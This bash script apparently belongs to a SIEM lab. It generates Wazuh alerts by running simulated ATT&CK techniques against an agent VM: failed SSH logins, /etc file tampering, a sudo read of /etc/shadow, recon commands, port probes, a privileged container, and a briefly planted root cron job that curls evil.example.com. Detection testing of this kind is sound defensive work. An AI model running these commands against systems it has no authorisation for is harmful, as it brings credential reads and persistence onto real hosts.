#!/usr/bin/env bash
# =============================================================================
# attack-simulation.sh — Generate security events for Wazuh to detect
# =============================================================================
# Runs simulated attacks against agent VMs to produce real alerts
# in the Wazuh Dashboard. Run this AFTER deployment is complete.
#
# Usage: ./attack-simulation.sh <agent-ip> [ssh-user] [ssh-key]
#
# MITRE ATT&CK coverage:
#   T1110.001 — Brute Force: Password Guessing
#   T1078     — Valid Accounts (sudo abuse)
#   T1565.001 — Data Manipulation: Stored Data
#   T1059.004 — Command & Scripting Interpreter: Unix Shell
#   T1046     — Network Service Scanning
#   T1053     — Scheduled Task/Job (cron)
#   T1610     — Deploy Container
# =============================================================================

set -euo pipefail

if [[ $# -lt 1 ]]; then
    echo "Usage: $0 <target-agent-ip> [ssh-user] [ssh-key]"
    echo "Example: $0 34.76.xxx.xxx ubuntu ~/.ssh/gcp_key"
    exit 1
fi

TARGET_IP="$1"
SSH_USER="${2:-${SSH_USER:-ubuntu}}"
SSH_KEY="${3:-${SSH_KEY:-$HOME/.ssh/gcp_key}}"
SSH_OPTS="-o StrictHostKeyChecking=no -o ConnectTimeout=5"

echo "=============================================="
echo "  SIEM Lab — Attack Simulation"
echo "  Target: ${SSH_USER}@${TARGET_IP}"
echo "  Key:    ${SSH_KEY}"
echo "=============================================="
echo ""

# --------------- Test 1: SSH Brute Force (T1110.001) ---------------
echo "[1/7] SSH brute-force simulation (T1110.001 — Password Guessing)..."
for i in $(seq 1 10); do
    ssh ${SSH_OPTS} -o BatchMode=yes -i /dev/null \
        "fakeuser${i}@${TARGET_IP}" 2>/dev/null || true
done
echo "      → 10 failed SSH attempts (triggers rule 5712: SSH brute force)"
echo ""

# --------------- Test 2: File Integrity Monitoring (T1565.001) ---------------
echo "[2/7] File Integrity Monitoring (T1565.001 — Stored Data Manipulation)..."
ssh -i "$SSH_KEY" ${SSH_OPTS} "${SSH_USER}@${TARGET_IP}" << 'REMOTE_FIM'
sudo touch /etc/siem-test-file.conf
sleep 2
sudo bash -c 'echo "malicious_config=true" >> /etc/siem-test-file.conf'
sleep 2
sudo chmod 777 /etc/siem-test-file.conf
sleep 2
sudo rm -f /etc/siem-test-file.conf
REMOTE_FIM
echo "      → FIM events: create, modify, chmod, delete in /etc"
echo ""

# --------------- Test 3: Privilege Escalation (T1078) ---------------
echo "[3/7] Privilege escalation attempts (T1078 — Valid Accounts)..."
ssh -i "$SSH_KEY" ${SSH_OPTS} "${SSH_USER}@${TARGET_IP}" << 'REMOTE_SUDO'
sudo -u nobody ls /root 2>/dev/null || true
sudo cat /etc/shadow 2>/dev/null || true
sudo useradd -M suspicioususer 2>/dev/null || true
sudo userdel suspicioususer 2>/dev/null || true
REMOTE_SUDO
echo "      → Sudo abuse + user creation/deletion logged"
echo ""

# --------------- Test 4: Suspicious Commands (T1059.004) ---------------
echo "[4/7] Suspicious command execution (T1059.004 — Unix Shell)..."
ssh -i "$SSH_KEY" ${SSH_OPTS} "${SSH_USER}@${TARGET_IP}" << 'REMOTE_CMD'
# Reconnaissance commands
whoami && id && uname -a
cat /etc/passwd | head -5
sudo netstat -tulnp 2>/dev/null || sudo ss -tulnp
ps aux --sort=-%mem | head -10
# Suspicious downloads
curl -s http://example.com > /dev/null 2>&1 || true
wget -q http://example.com -O /tmp/test_download 2>/dev/null || true
rm -f /tmp/test_download
REMOTE_CMD
echo "      → Recon + suspicious downloads logged"
echo ""

# --------------- Test 5: Network Scanning (T1046) ---------------
echo "[5/7] Network scanning simulation (T1046 — Network Service Scanning)..."
ssh -i "$SSH_KEY" ${SSH_OPTS} "${SSH_USER}@${TARGET_IP}" << 'REMOTE_SCAN'
# Port scan simulation (generates connection logs)
for port in 22 80 443 3306 5432 8080 9200; do
    (echo >/dev/tcp/localhost/$port) 2>/dev/null && echo "Port $port: open" || true
done
# DNS lookups for suspicious domains
nslookup example.com 2>/dev/null || host example.com 2>/dev/null || true
REMOTE_SCAN
echo "      → Port scan + DNS lookup activity logged"
echo ""

# --------------- Test 6: Cron Manipulation (T1053) ---------------
echo "[6/7] Scheduled task manipulation (T1053 — Cron)..."
ssh -i "$SSH_KEY" ${SSH_OPTS} "${SSH_USER}@${TARGET_IP}" << 'REMOTE_CRON'
# Create and remove a suspicious cron job
sudo bash -c 'echo "* * * * * root curl http://evil.example.com" > /etc/cron.d/siem-test'
sleep 3
sudo rm -f /etc/cron.d/siem-test
REMOTE_CRON
echo "      → Suspicious cron job created and removed"
echo ""

# --------------- Test 7: Container Activity (T1610) ---------------
echo "[7/7] Container deployment (T1610 — Deploy Container)..."
ssh -i "$SSH_KEY" ${SSH_OPTS} "${SSH_USER}@${TARGET_IP}" << 'REMOTE_DOCKER'
docker pull alpine:latest 2>/dev/null || true
docker run --rm --name siem-test alpine echo "SIEM test container" 2>/dev/null || true
docker run --rm --privileged alpine echo "Privileged container!" 2>/dev/null || true
REMOTE_DOCKER
echo "      → Docker events including privileged container"
echo ""

echo "=============================================="
echo "  ✅ Simulation Complete — 7 attack vectors"
echo "=============================================="
echo ""
echo "  MITRE ATT&CK techniques triggered:"
echo "    T1110.001  Brute Force: Password Guessing"
echo "    T1565.001  Data Manipulation: Stored Data"
echo "    T1078      Valid Accounts (privilege escalation)"
echo "    T1059.004  Command & Scripting Interpreter"
echo "    T1046      Network Service Scanning"
echo "    T1053      Scheduled Task/Job"
echo "    T1610      Deploy Container"
echo ""
echo "  Check: Wazuh Dashboard → Security Events"
echo "  Note:  Alerts may take 1-2 minutes to appear."
echo "=============================================="
